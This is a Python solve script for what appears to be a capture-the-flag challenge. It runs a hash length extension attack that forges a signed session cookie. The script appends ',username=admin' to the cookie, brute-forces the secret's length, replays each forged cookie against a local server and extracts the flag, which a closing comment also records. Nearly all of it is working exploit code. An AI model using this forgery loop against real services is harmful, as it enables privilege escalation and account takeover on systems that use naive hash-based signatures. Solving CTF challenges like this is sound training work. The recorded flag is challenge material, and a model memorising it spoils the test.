
import hashpumpy
import base64
import requests
import urllib3
import re
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxyDict = {
    "http"  : 'http://127.0.0.1:8080',
    "https" : 'http://127.0.0.1:8080',
}

# Attacker knows: Hash(message1) and length of message1 
# Attacker controlls message2
# Attacker calculates Hash(message1 ‖ message2) 

# cookie from remote
cookie = 'dXNlcm5hbWU9ZmFuZSxsb2NhbGU9ZW58Yjg0ZTkxZmU4ZDNmOTkyYmFlYWQ1OGRhODEzYjg0ZjNmYjcxZDg4MzI3ZTEzNDVjY2QwMWRkNmIyODQwYTI2YQ=='
cookie = base64.b64decode(cookie).decode('ascii')

user_string, signature_str = cookie.split('|')
Hmessage1 = signature_str
message1_length = 1

message2 = ',username=admin'
while message1_length < 40:
    new_signature, new_msg = hashpumpy.hashpump(signature_str, user_string, message2, message1_length)

    new_cookie = new_msg + b'|' + bytes(new_signature, encoding='utf-8')
    print(new_cookie)
    new_cookie = base64.b64encode(new_cookie).decode('ascii')
    print(new_cookie)

    s = requests.Session()
    cookie_obj = requests.cookies.create_cookie(
        name="user", value=new_cookie
    )
    s.cookies.set_cookie(cookie_obj)

    host = '127.0.0.1:5000'
    base_url = 'http://'+host
    r = s.get(base_url+'/notes', proxies=proxyDict, verify=False, allow_redirects=False)
    print(r.text)
    if 'admin' in r.text:
        flag = re.search(r'ptm{.+}', r.text).group(0)
        break

    message1_length += 1
print(message1_length)
print(new_cookie)
print("Flag: " + flag)

# ptm{pleaseD0NOTUseCr3am1nCarbon4r4!}
